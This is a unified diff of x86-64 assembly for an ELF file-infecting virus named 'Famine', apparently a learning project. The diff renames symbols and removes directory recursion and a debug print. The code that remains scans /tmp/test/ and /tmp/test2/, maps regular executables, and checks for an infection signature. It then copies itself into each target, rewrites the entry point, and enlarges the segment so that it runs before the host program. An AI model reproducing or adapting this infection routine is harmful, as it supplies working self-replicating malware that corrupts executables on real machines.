@@ -1,6 +1,5 @@
 %include "./header.s"
 
-section     .text
 global      _start                              ;must be declared for linker (ld)
 
 
@@ -9,17 +8,18 @@ _host:
 	syscall
 
 
-_start:   ;tell linker entry point
+_start:   ;Entry-Point
 	push rdi
 	push rsi
 	push rcx
 	push rdx
-
 	push rbp
 	mov rbp, rsp
 	sub rbp, famine_size
+	
+	
 	lea rax, [rel _start]
-	mov rdx, [rel virus_entry]
+	mov rdx, [rel famine_entry]
 	sub rax, rdx
 	add rax, [rel host_entry]
 	push rax
@@ -52,8 +52,6 @@ _start:   ;tell linker entry point
 	mov al, byte[rdi + rdx - 1]
 	add rdi, dirent.d_name
 	add r13, rdx
-	cmp al, DT_DIR
-	je .adddir
 	cmp al, DT_REG
 	jne .nextfile
 	call process
@@ -84,39 +82,6 @@ _start:   ;tell linker entry point
 	pop rdi
 	jmp rax
 
-.adddir:
-	PUSH
-
-	mov rsi, r14
-	mov rax, rdi
-	lea rdi, STACK(famine.file_path)
-	mov rdx, rdi
-	cmp byte[rax], 0x2e
-	je .skip
-	.dna:
-	movsb
-	cmp byte[rsi], 0
-	jnz .dna
-	mov rsi, rax
-	.fna:
-	movsb
-	cmp byte[rsi -1], 0
-	jnz .fna
-	mov rdi, rdx
-
-	mov rsi, rdi
-	call _strlen
-	mov rdx, rax
-	mov rax, 1
-	mov rdi, 1
-	syscall
-	.skip:
-	POP
-	cmp al, DT_REG
-	jne .nextfile
-	call process
-	jmp .nextfile
-	
 process:
 	mov rsi, r14
 	mov rax, rdi
@@ -153,7 +118,7 @@ process:
 	jnz .close
 	mov rsi, qword STACK(famine.stat + stat.st_size)
 	mov STACK(famine.file_size), rsi
-	cmp rsi, elf64_ehdr_size + elf64_phdr_size + VIRUS_SIZE
+	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE
 	jl .close
 				;MMAP file
 	xor r9, r9
@@ -246,18 +211,18 @@ inject_self:
 	lea rdi, [r15 + rax]
 	mov rsi, rdi
 	xor al, al
-	mov rcx, VIRUS_SIZE
+	mov rcx, FAMINE_SIZE
 	repz scasb
 	test rcx, rcx
-							;check if already infected
+							;check if already we can find signature already
 	lea rdi, [rel _start]
 	xchg rdi, rsi
 	mov rax, [rel signature]
-	cmp rax, qword [rdi  - (_finish - signature)]
+	cmp rax, qword [rdi  - (_end - signature)]
 	jz .return
 
-							;infect
-	mov rcx, VIRUS_SIZE
+							;infect target
+	mov rcx, FAMINE_SIZE
 	repnz movsb
 							;set ep
 	mov rax, qword[r15 + elf64_ehdr.e_entry]
@@ -265,7 +230,7 @@ inject_self:
 	mov qword [rdi - 8], rax
 							;edit header
 	mov [r15 + elf64_ehdr.e_entry], r13
-	mov rax, VIRUS_SIZE
+	mov rax, FAMINE_SIZE
 	add qword [r14 + elf64_phdr.p_filesz], rax
 	add qword [r14 + elf64_phdr.p_memsz], rax
 
@@ -275,25 +240,8 @@ inject_self:
 		pop r13
 		ret
 
-
-_strlen:
-	push rcx
-	push rdi
-	xor rcx, rcx
-_strlen_next:
-	cmp [rdi], byte 0
-	jz _strlen_null
-	inc rcx
-	inc rdi
-	jmp _strlen_next
-_strlen_null:
-	mov rax, rcx
-	pop rdi
-	pop rcx
-	ret
-
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
-virus_entry		dq			_start
+famine_entry	dq			_start
 host_entry		dq			_host
-_finish:
+_end:
